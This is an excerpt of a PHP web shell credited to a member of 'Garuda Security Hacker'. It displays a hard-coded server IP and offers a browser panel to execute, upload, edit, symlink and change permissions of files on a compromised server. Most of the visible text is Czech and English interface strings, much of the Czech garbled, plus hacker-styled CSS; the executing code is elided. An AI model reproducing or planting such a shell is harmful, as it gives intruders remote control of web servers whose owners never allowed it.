<?php
/* Create By ShaddowHerts
Greats To All Member Garuda Security Hacker
*/
$lang = 'auto';
$site_charset = 'auto';
$homedir = './';
...
echo "Server IP:<font color=lime>104.156.56.228".@$ip."</font> | Your IP: <font color=lime>".$_SERVER['REMOTE_ADDR']."</font><br>";
...
'not_readable' => '"[%1]" okunamiyor.'
	...
	case 'cs':
		$date_format = 'd.m.y H:i:s';
		$word_charset = 'UTF-8';
return array('directory' => 'Adres????', 'file' => 'Soubor', 'filename' => 'Jm??no souboru', 'size' => 'Velikost', 'permission' => 'Pr??va', 'owner' => 'Vlastn??k',
'group' => 'Skupina', 'other' => 'Ostatn??',
'functions' => 'Funkce', 'read' => '??ten??', 'write' => 'Z??pis',
'execute' => 'Spou??t??n??', 'create_symlink' => 'Vytvo??it symbolick?? odkaz', 'delete' => 'Smazat', 'rename' => 'P??ejmenovat', 'move' => 'P??esunout', 'copy' => 'Zkop??rovat', 'edit' => 'Otev????t',
'download' => 'St??hnout', 'upload' => 'Nahraj na server', 'create' => 'Vytvo??it', 'change' => 'Zm??nit', 'save' => 'Ulo??it', 'set' => 'Nastavit', 'reset' => 'zp??t', 'relative' => 'Relatif',
'yes' => 'Ano', 'no' => 'Ne',
'back' => 'Zp??t', 'destination' => 'Destination', 'symlink' => 'Symbolick?? odkaz', 'no_output' => 'Pr??zdn?? v??stup', 'user' => 'U??ivatel', 'password' => 'Heslo', 'add' => 'P??idat', 'add_basic_auth' => 'p??idej z??kladn?? autentizaci', 'uploaded' => 'Soubor "[%1]" byl nahr??n na server.', 'not_uploaded' => 'Soubor "[%1]" nebyl nahr??n na server.', 'already_exists' => 'Soubor "[%1]" u?? exituje.', 'created' => 'Soubor "[%1]" byl vytvo??en.', 'not_created' => 'Soubor "[%1]" nemohl b??t  vytvo??en.', 'really_delete' => 'Vymazat soubor?', 'deleted' => "Byly vymaz??ny tyto soubory:\ [%1]", 'not_deleted' => "Tyto soubory nemohly b??t vytvo??eny:\ [%1]",
'rename_file' => 'P??ejmenuj soubory:',
'renamed' => 'Soubor "[%1]" byl p??ejmenov??n na "[%2]".',
'not_renamed' => 'Soubor "[%1]" nemohl b??t p??ejmenov??n na "[%2]".',
'move_files' => 'P??em??stit tyto soubory:', 'moved' => "Tyto soubory byly p??em??st??ny do \"[%2]\":\ [%1]", 'not_moved' => "Tyto soubory nemohly b??t p??em??st??ny do \"[%2]\":\ [%1]", 'copy_files' => 'Zkop??rovat tyto soubory:', 'copied' => "Tyto soubory byly zkop??rov??ny do \"[%2]\":\
[%1]", 'not_copied' => "Tyto soubory nemohly b??t zkop??rov??ny do \"[%2]\":\
[%1]", 'not_edited' => 'Soubor "[%1]" nemohl b??t otev??en.',
'executed' => "SOubor \"[%1]\" byl spu??t??n :\ {%2}", 'not_executed' => "Soubor \"[%1]\" nemohl b??t spu??t??n:\ {%2}",
...
'not_readable' => 'Soubor "[%1]" nen?? mo??no p??e????st.' );
	...
	default:
		$date_format = 'n/j/y H:i:s';
		$word_charset = 'ISO-8859-1';
return array( 'directory' => 'Directory', 'file' => 'File', 'filename' => 'Filename', 'size' => 'Size', 'permission' => 'Permission', 'owner' => 'Owner', 'group' => 'Group', 'other' => 'Others',
'functions' => 'Functions', 'read' => 'read', 'write' => 'write', 'execute' => 'execute', 'create_symlink' => 'create symlink', 'delete' => 'delete',
'rename' => 'rename', 'move' => 'move', 'copy' => 'copy', 'edit' => 'edit', 'download' => 'download', 'upload' => 'upload',
'create' => 'create', 'change' => 'change', 'save' => 'save', 'set' => 'set', 'reset' => 'reset',
'relative' => 'Relative path to target', 'yes' => 'Yes', 'no' => 'No', 'back' => 'back', 'destination' => 'Destination', 'symlink' => 'Symlink', 'no_output' => 'no output', 'user' => 'User', 'password' => 'Password', 'add' => 'add', 'add_basic_auth' => 'add basic-authentification', 'uploaded' => '"[%1]" has been uploaded.',
'not_uploaded' => '"[%1]" could not be uploaded.', 'already_exists' => '"[%1]" already exists.',
'created' => '"[%1]" has been created.', 'not_created' => '"[%1]" could not be created.', 'really_delete' => 'Delete these files?', 'deleted' => "These files have been deleted:\ [%1]", 'not_deleted' => "These files could not be deleted:\ [%1]",'rename_file' => 'Rename file:', 'renamed' => '"[%1]" has been renamed to "[%2]".', 'not_renamed' => '"[%1] could not be renamed to "[%2]".', 'move_files' => 'Move these files:', 'moved' => "These files have been moved to \"[%2]\":\ [%1]",
'not_moved' => "These files could not be moved to \"[%2]\":\ [%1]", 'copy_files' => 'Copy these files:', 'copied' => "These files have been copied to \"[%2]\":\
[%1]", 'not_copied' => "These files could not be copied to \"[%2]\":\ [%1]", 'not_edited' => '"[%1]" can not be edited.', 'executed' => "\"[%1]\" has been executed successfully:\ {%2}", 'not_executed' => "\"[%1]\" could not be executed successfully:\ {%2}", 'saved' => '"[%1]" has been saved.',
'not_saved' => '"[%1]" could not be saved.', 'symlinked' => 'Symlink from "[%2]" to "[%1]" has been created.', 'not_symlinked' => 'Symlink from "[%2]" to "[%1]" could not be created.',
'permission_for' => 'Permission of "[%1]":', 'permission_set' => 'Permission of "[%1]" was set to [%2].', 'permission_not_set' => 'Permission of "[%1]" could not be set to [%2].', 'not_readable' => '"[%1]" can not be read.' );
	}
}
...
<style type="text/css">
html {
	 background: url(https://scontent-sit4-1.xx.fbcdn.net/v/t1.0-0/q85/s350x350/14450016_1687358304918700_4865127083709182139_n.jpg?oh=de4bf8a679127f412f47cf46823988da&oe=592147D3) no-repeat center center fixed; 
...
.listing th, .listing td { padding: 1px 3pt 0 3pt ;box-shadow: 0px 0px 15px yellow;}
.listing th { border: 1px solid silver ;box-shadow: 0px 0px 15px yellow;}
.listing td { border: 1px solid #ddd; background: black }
.listing .checkbox { text-align: center }
.listing .filename { text-align: left ;box-shadow: 0px 0px 15px lime;}
...
textarea { border: none; background: lime }
...
#menu a{
	padding:4px 20px;
	   border: 1px solid white;box-shadow: 0px 0px 15px red;
	margin:0;
	letter-spacing:2px;
		width: 100%;
	height: 170px;
